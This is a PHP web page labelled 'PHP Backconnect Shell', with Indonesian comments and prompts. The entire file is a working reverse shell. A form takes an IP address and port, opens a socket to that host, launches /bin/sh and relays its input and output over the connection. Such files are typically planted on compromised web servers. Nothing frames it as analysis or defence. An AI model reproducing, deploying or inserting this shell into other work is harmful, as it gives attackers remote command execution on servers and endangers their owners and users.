<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ip']) && isset($_POST['port'])) {
    $ip = $_POST['ip'];
    $port = $_POST['port'];

    // Membuka koneksi
    $sock = fsockopen($ip, $port);
    if (!$sock) {
        die("Koneksi balik gagal ke $ip:$port.");
    }

    // Menghubungkan shell ke socket
    $descriptorspec = array(
        0 => array("pipe", "r"), // STDIN
        1 => array("pipe", "w"), // STDOUT
        2 => array("pipe", "w")  // STDERR
    );
    $process = proc_open('/bin/sh', $descriptorspec, $pipes);

    if (is_resource($process)) {
        stream_set_blocking($pipes[1], false);
        stream_set_blocking($pipes[2], false);
        while (!feof($sock)) {
            $data = fgets($sock);
            if ($data) {
                fwrite($pipes[0], $data);
            }
            $output = stream_get_contents($pipes[1]);
            if ($output) {
                fwrite($sock, $output);
            }
            $error = stream_get_contents($pipes[2]);
            if ($error) {
                fwrite($sock, $error);
            }
        }
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
    fclose($sock);
    die("Koneksi balik berhasil ke $ip:$port.");
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Backconnect</title>
</head>
<body>
    <h1>PHP Backconnect Shell</h1>
    <form method="POST">
        <label for="ip">IP Address:</label><br>
        <input type="text" id="ip" name="ip" placeholder="Masukkan IP Anda" required><br><br>
        <label for="port">Port:</label><br>
        <input type="number" id="port" name="port" placeholder="Masukkan Port Anda" required><br><br>
        <button type="submit">Connect</button>
    </form>
</body>
</html>
